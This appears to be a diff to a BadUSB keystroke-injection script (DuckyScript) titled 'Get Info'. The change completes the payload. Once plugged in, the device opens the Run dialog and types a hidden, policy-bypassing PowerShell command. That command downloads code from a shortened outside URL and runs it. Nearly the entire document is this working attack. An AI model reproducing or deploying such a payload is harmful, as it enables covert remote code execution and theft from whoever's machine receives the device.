@@ -2,5 +2,5 @@ REM Title: Get Info
 REM Author: Contrxl
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass $db='';irm https://rb.gy/6oapzb| iex
 ENTER
